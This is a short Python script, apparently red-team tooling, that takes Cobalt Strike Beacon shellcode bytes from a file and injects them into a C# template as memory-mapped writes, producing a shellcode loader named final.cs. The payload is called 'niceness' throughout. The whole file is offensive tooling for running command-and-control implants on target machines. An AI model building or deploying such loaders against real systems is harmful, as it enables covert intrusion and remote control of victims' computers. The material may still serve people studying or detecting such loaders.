#Modified from the work of https://github.com/fullmetalcache/CsharpMMNiceness
#using Cobalt Strike Beacon shellcode generated from https://github.com/RCStep/CSSG
#xx0hcd

import argparse
import base64
import subprocess
import random
import string
import sys
from itertools import *

#leave the original variables, etc alone
#tmpshell.txt is the shellode file, output format leading zeros "0x90,0x90", etc
tmpNicenessFile = 'tmpshell.txt'
outputFile = 'final.cs'
outfile = 'tmpshell.txt'

def grabCSTemplate():
    #assuming the 'niceness_template.cs' is in your current dir.
    with open('niceness_template.cs', 'r') as f:
        script = f.read()
    return script

def injectNiceness(script, nicenessFile, outfile):

    fin = open(nicenessFile)
    niceBytes = []
    for line in fin:
        line = line.rstrip()
        bytes_curr = line.split(",")
    
        for byte in bytes_curr:
            byte = byte.split(",")[0]
            niceBytes.append(byte)

    fout = open(outfile, 'w')
    scriptLines = script.split("\n")

    for line in scriptLines:
        if '$$$LENGTH$$$' in line:
          line = line.replace('$$$LENGTH$$$', "{0};\n".format(len(niceBytes)))

        elif '$$$NICENESS$$$' in line:
            line = ""

            idx = 0
            for byte in niceBytes:
                fout.write("mmva.Write({0}, ((byte){1}));\n".format(idx, byte))
                idx += 1

        fout.write(line + '\n')

    fout.close()

   
if __name__== "__main__":
    template = grabCSTemplate()
    injectNiceness( template, tmpNicenessFile, outputFile )
